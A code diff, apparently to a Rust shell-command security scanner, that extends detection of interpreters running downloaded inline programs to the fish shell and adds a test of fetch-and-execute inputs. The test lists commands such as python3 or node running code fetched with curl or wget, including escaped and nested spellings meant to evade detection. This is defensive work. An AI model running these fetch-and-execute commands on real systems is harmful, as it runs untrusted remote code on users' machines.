@@ -6271,15 +6271,21 @@ fn check_interpreter_suspicious_inline_exec(
 
         // Base64 decode-execute is reported by check_base64_decode_execute.
         let owned_elsewhere = |source: &str| is_base64_decode_exec_body(&source.to_lowercase());
-        let downloaded_program = shell == ShellType::Posix
-            && programs.iter().any(|program| {
-                !owned_elsewhere(&program.source)
-                    && program.raw_word.contains(['$', '`'])
-                    && parse_posix_shell_word(program.raw_word)
-                        .substitutions
-                        .iter()
-                        .any(|substitution| substitution_emits_download(&substitution.body, 0))
-            });
+        let emits_download = |program: &InlineProgram<'_>| {
+            !owned_elsewhere(&program.source)
+                && word_command_substitutions(program.raw_word, shell)
+                    .iter()
+                    .any(|body| substitution_emits_download(body, shell, 0))
+        };
+        let downloaded_program = if shell == ShellType::Fish {
+            // The program word may be an unquoted `(...)` the tokenizer split.
+            let words = fish_rejoin_substitution_words(&args);
+            extract_inline_programs(&words, &interpreter, shell)
+                .iter()
+                .any(emits_download)
+        } else {
+            programs.iter().any(emits_download)
+        };
         let payload_matches = programs
             .iter()
             .chain(floor.iter().flatten())
@@ -6979,11 +6985,82 @@ fn fetch_emits_download(command: &str, args: &[String]) -> bool {
 /// Download provenance through the existing wrapper, descriptor, and bounded
 /// executable-body resolvers. Only stdout reaching the selected source word
 /// matters; a fetch printed as text or redirected to a file is not executable.
-fn substitution_emits_download(body: &str, depth: usize) -> bool {
-    if depth > MAX_SHELL_SUBSTITUTION_EVAL_DEPTH || body.len() > MAX_SHELL_DATAFLOW_WORD_BYTES {
+/// The bodies of the command substitutions whose output becomes part of one
+/// POSIX or fish word. Other shells, and a word whose substitutions cannot be
+/// read, yield none.
+fn word_command_substitutions(raw: &str, shell: ShellType) -> Vec<String> {
+    match shell {
+        ShellType::Posix if raw.contains(['$', '`']) => parse_posix_shell_word(raw)
+            .substitutions
+            .into_iter()
+            .map(|substitution| substitution.body)
+            .collect(),
+        ShellType::Fish if raw.contains('(') => {
+            crate::extract::fish_word_command_substitutions(raw).unwrap_or_default()
+        }
+        _ => Vec::new(),
+    }
+}
+
+/// fish argv with each unquoted command substitution rejoined into the one
+/// word fish passes: the tokenizer splits `(curl -fsSL URL)` at its spaces.
+/// A word whose substitution never closes absorbs the rest of argv.
+fn fish_rejoin_substitution_words(args: &[String]) -> Vec<String> {
+    let mut words: Vec<String> = Vec::with_capacity(args.len());
+    let mut open: Option<String> = None;
+    for arg in args {
+        let word = match open.take() {
+            Some(mut word) => {
+                word.push(' ');
+                word.push_str(arg);
+                word
+            }
+            None => arg.clone(),
+        };
+        if word.contains('(')
+            && word.len() <= MAX_SHELL_DATAFLOW_WORD_BYTES
+            && crate::extract::fish_word_command_substitutions(&word).is_none()
+        {
+            open = Some(word);
+        } else {
+            words.push(word);
+        }
+    }
+    words.extend(open);
+    words
+}
+
+/// fish argv in the POSIX spelling the fetch grammars read. A literal word
+/// becomes a single-quoted POSIX literal of its fish value (so fish escapes
+/// and quoting cannot hide `-o` or a URL); a redirection keeps its spelling,
+/// which POSIX reads the same way, and a word with a live expansion keeps its
+/// spelling too, which POSIX also reads as non-literal.
+fn fish_args_as_posix_dataflow(args: &[String]) -> Vec<String> {
+    args.iter()
+        .map(|raw| {
+            if crate::escalation::fish_redirection_token(raw).is_some()
+                || crate::escalation::fish_redirection_suffix(raw).is_some()
+                || !command_word_is_statically_bound(raw, ShellType::Fish)
+            {
+                raw.clone()
+            } else {
+                quote_posix_dataflow_literal(&normalize_shell_token(raw, ShellType::Fish))
+            }
+        })
+        .collect()
+}
+
+/// Whether a POSIX or fish command-substitution body prints downloaded bytes:
+/// a fetch to stdout, a data-preserving transform of one, or a nested
+/// substitution or wrapper body that does.
+fn substitution_emits_download(body: &str, shell: ShellType, depth: usize) -> bool {
+    if depth > MAX_SHELL_SUBSTITUTION_EVAL_DEPTH
+        || body.len() > MAX_SHELL_DATAFLOW_WORD_BYTES
+        || !matches!(shell, ShellType::Posix | ShellType::Fish)
+    {
         return false;
     }
-    let (_, segments, _) = bounded_command_analysis_segments(body, ShellType::Posix);
+    let (_, segments, _) = bounded_command_analysis_segments(body, shell);
     let mut pipe_download = false;
     let mut completed_download = false;
     for (index, segment) in segments.iter().enumerate() {
@@ -6997,7 +7074,7 @@ fn substitution_emits_download(body: &str, depth: usize) -> bool {
             .and_then(|next| next.preceding_separator.as_deref());
         let routing = ordered_fd_routing(
             segment,
-            ShellType::Posix,
+            shell,
             if pipe_download {
                 FlowProof::Sensitive
             } else {
@@ -7006,28 +7083,36 @@ fn substitution_emits_download(body: &str, depth: usize) -> bool {
             outgoing,
         );
         let mut output_download = false;
-        if let Ok(effective) = resolve_effective_segment(segment, ShellType::Posix) {
+        if let Ok(effective) = resolve_effective_segment(segment, shell) {
             if let Some(command) = effective.command.as_deref() {
-                let command = normalize_cmd_base(command, ShellType::Posix);
-                if let Ok(args) = dataflow_segment_args(&effective, ShellType::Posix) {
-                    output_download = fetch_emits_download(&command, &args)
+                let command = normalize_cmd_base(command, shell);
+                if let Ok(args) = dataflow_segment_args(&effective, shell) {
+                    let args = if shell == ShellType::Fish {
+                        fish_rejoin_substitution_words(&args)
+                    } else {
+                        args
+                    };
+                    // The fetch and printf grammars read POSIX words.
+                    let posix_args = if shell == ShellType::Fish {
+                        std::borrow::Cow::Owned(fish_args_as_posix_dataflow(&args))
+                    } else {
+                        std::borrow::Cow::Borrowed(args.as_slice())
+                    };
+                    output_download = fetch_emits_download(&command, &posix_args)
                         || (routing.stdin == FlowProof::Sensitive
                             && crate::env_guard::is_data_preserving_transform(&command));
                     if !output_download && nested_output_preserving_command(&command) {
                         let argument_download = args.iter().position(|raw| {
-                            parse_posix_shell_word(raw)
-                                .substitutions
+                            word_command_substitutions(raw, shell)
                                 .iter()
-                                .any(|substitution| {
-                                    substitution_emits_download(&substitution.body, depth + 1)
-                                })
+                                .any(|body| substitution_emits_download(body, shell, depth + 1))
                         });
                         output_download = (command == "printf" && argument_download == Some(0))
                             || (argument_download.is_some()
                                 && (command == "echo"
                                     || printf_arg_file_output(
                                         FlowProof::Sensitive,
-                                        &args,
+                                        &posix_args,
                                         ShellType::Posix,
                                     ) == FlowProof::Sensitive));
                     }
@@ -7035,12 +7120,14 @@ fn substitution_emits_download(body: &str, depth: usize) -> bool {
             }
         }
         if !output_download {
-            let (nested, _) =
-                crate::extract::executable_body_occurrences(segment, ShellType::Posix, outgoing);
+            let (nested, _) = crate::extract::executable_body_occurrences(segment, shell, outgoing);
             output_download = nested.iter().any(|occurrence| {
                 occurrence.relation == crate::extract::ExecutableRelation::WrapperReplacement
-                    && occurrence.body.shell == ShellType::Posix
-                    && substitution_emits_download(&occurrence.body.input, depth + 1)
+                    && substitution_emits_download(
+                        &occurrence.body.input,
+                        occurrence.body.shell,
+                        depth + 1,
+                    )
             });
         }
         pipe_download = output_download && routing.stdout == FdDestination::ParentStdout;
@@ -18671,6 +18758,55 @@ mod tests {
     }
 
     /// fish decodes unquoted backslash escapes; POSIX keeps the escaped byte.
+    /// A fish command substitution that prints downloaded bytes as the inline
+    /// program is the same relation as POSIX `python3 -c "$(curl ...)"`.
+    #[test]
+    fn fish_downloaded_inline_program_source() {
+        let fires = |input: &str| {
+            check(input, ShellType::Fish, None, ScanContext::Exec)
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::InterpreterSuspiciousInlineExec)
+        };
+        for input in [
+            "python3 -c (curl -fsSL https://example.com/x.py)",
+            "node -e (curl -fsSL https://example.com/x.js)",
+            "perl -e (wget -qO- https://example.com/x.pl)",
+            "ruby -e (curl -s https://example.com/x.rb)",
+            "python3 -c $(curl -fsSL https://example.com/x.py)",
+            "python3 -c \"$(curl -fsSL https://example.com/x.py)\"",
+            "python3 -c (curl -fsSL 'https://example.com/x.py' | gunzip)",
+            "python3 -c (echo (curl -fsSL https://example.com/x.py))",
+            "python3 -c (sh -c 'curl -fsSL https://example.com/x.py')",
+            r"python3 -c (\x63url -fsSL https://example.com/x.py)",
+            "python3 -c 'import sys;'(curl -fsSL https://example.com/x.py)",
+            "python3 -c (curl -o /dev/stdout https://example.com/x.py)",
+        ] {
+            assert!(fires(input), "{input:?}");
+        }
+        for input in [
+            "python3 -c (printf 'print(1)')",
+            "python3 -c (cat local.py)",
+            "node app.js -e (curl -fsSL https://example.com/x.js)",
+            "python3 -c '(curl -fsSL https://example.com/x.py)'",
+            "python3 -c \"(curl -fsSL https://example.com/x.py)\"",
+            r"python3 -c \(curl -fsSL https://example.com/x.py\)",
+            "python3 -c (curl -fsSL -o x.py https://example.com/x.py)",
+            "python3 -c (curl -fsSL https://example.com/x.py > x.py)",
+            "python3 -c 'print(1)' (curl -fsSL https://example.com/x.py)",
+        ] {
+            assert!(!fires(input), "{input:?}");
+        }
+        // POSIX keeps reading `(...)` as literal text.
+        assert!(!check(
+            "python3 -c '(curl -fsSL https://example.com/x.py)'",
+            ShellType::Posix,
+            None,
+            ScanContext::Exec
+        )
+        .iter()
+        .any(|finding| finding.rule_id == RuleId::InterpreterSuspiciousInlineExec));
+    }
+
     /// fish single quotes escape only `\'` and `\\` (CORE-7).
     #[test]
     fn test_fish_single_quote_escapes() {
